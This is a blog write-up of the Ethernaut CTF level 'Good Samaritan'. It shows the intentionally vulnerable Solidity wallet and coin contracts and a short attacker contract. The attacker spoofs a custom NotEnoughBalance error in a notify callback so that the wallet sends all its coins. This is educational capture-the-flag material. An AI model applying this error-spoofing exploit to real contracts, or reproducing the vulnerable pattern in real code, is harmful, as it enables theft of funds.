---
layout: post
title: Ethernaut - 27. Good Samaritan
date:  2022-09-16
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌑🌑
> This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. <br />
Would you be able to drain all the balance from his Wallet?<br />
Things that might help:
- [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

## Writeup
The `requestDonation()` in the GoodSamaritan contract will call `wallet.donate10(msg.sender)` if there are enough coins(>10) in the wallet. If coins in the wallet less then 10, it will revert `NotEnoughBalance` error and transfer all remaining coins in the wallet.
1. Get new instance.
2. Create a new contract. 
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity >=0.8.0 <0.9.0;

    interface GoodSamaritan {
        function requestDonation() external returns(bool enoughBalance);
    }

    contract GoodSamaritanAttacker {

        error NotEnoughBalance();

        function attack(address _goodsamaritan) public {
            GoodSamaritan(_goodsamaritan).requestDonation(); 
        }

        function notify(uint256 _amount) public pure {
            if(_amount==10){
                revert NotEnoughBalance();
            }
        }
    }
    ```
3. Get `GoodSamaritan` contract address by typing `instance` in the chrome console. For example: 
    ``` javascript

    instance
    // '0xa273e96Ae56e2cAb404a3221d5356Af4cdd67440'

    ```
4. Call the `attack` method in `GoodSamaritanAttacker` contract with the contract address we get above as a parameter.
5. Submit instance ξ( ✿＞◡❛)
